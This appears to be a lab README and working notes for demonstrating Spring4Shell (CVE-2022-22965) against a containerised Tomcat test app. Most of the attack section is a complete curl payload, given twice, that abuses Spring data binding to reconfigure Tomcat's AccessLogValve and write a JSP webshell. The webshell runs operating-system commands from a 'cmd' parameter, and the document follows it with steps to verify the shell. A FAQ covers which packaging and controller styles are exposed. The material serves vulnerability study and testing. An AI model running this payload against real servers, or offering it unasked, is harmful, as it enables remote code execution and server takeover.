Spring4Shell (CVE-2022-22965) Demo
Demonstrates the vulnerability in Spring Framework data binding that allows RCE via Tomcat's AccessLogValve.
Requirements
JDK 11+
Maven
Docker or Podman
Quick Start
bash
cd test-app
mvn clean package -DskipTests

podman build -t test-app .
podman run -d --name spring4shell -p 8080:8080 test-app

curl http://localhost:8080/greeting
Exploit
bash
curl -X POST \
  -H "pre:<%" \
  -H "post:;>" \
  -H "colon:;" \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}i java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()%{colon}i int a = -1%{colon}i byte[] b = new byte[2048]%{colon}i while((a=in.read(b))!=-1){ out.println(new String(b))%{colon}i } %{post}i' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/app' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
  http://localhost:8080/greeting
Verify Webshell
bash
podman exec spring4shell ls -la /usr/local/tomcat/webapps/app/

podman exec spring4shell cat /usr/local/tomcat/webapps/app/rce.jsp

curl "http://localhost:8080/app/rce.jsp?cmd=whoami"
Debug Chain
bash
curl http://localhost:8080/debug/chain
FAQ
Q: How do I know getFirst() returns AccessLogValve?
Depends on Tomcat configuration. Default has AccessLogValve in server.xml. Use /debug/chain to see actual valve.
Q: Is JAR packaging vulnerable?
No. JAR uses embedded Tomcat with different classloader hierarchy. The chain classLoader.getResources().getContext() doesn't exist in embedded mode.
Q: Is @RestController vulnerable?
Yes with form data, no with JSON:
java
public User create(User user) { }              // Vulnerable
public User create(@RequestBody User user) { } // Safe
Cleanup
bash
podman stop spring4shell && podman rm spring4shell
References
Tomcat AccessLogValve
CVE-2022-22965

in test-app folder
mvn clean compile


http://localhost:8080/greeting


just test the if the app starts
mvn spring-boot:run 

build the actuall war
mvn clean package -DskipTests

(podman machine init)
podman build -t test-app .

curl -X POST \
-H "pre:<%" \
-H "post:;>" \
-H "colon:;" \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}i java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()%{colon}i int a = -1%{colon}i byte[] b = new byte[2048]%{colon}i while((a=in.read(b))!=-1){ out.println(new String(b))%{colon}i } %{post}i' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/app' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \
-F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
http://localhost:8080/greeting



how do I know that getFirst() will return AccessLogValve?
How can I be sure JAR packaging is not vulnerable. Maybe just the exploit is not public?
Is @RestController also vulnerable



references:
https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html#Access_Log_Valve/Attributes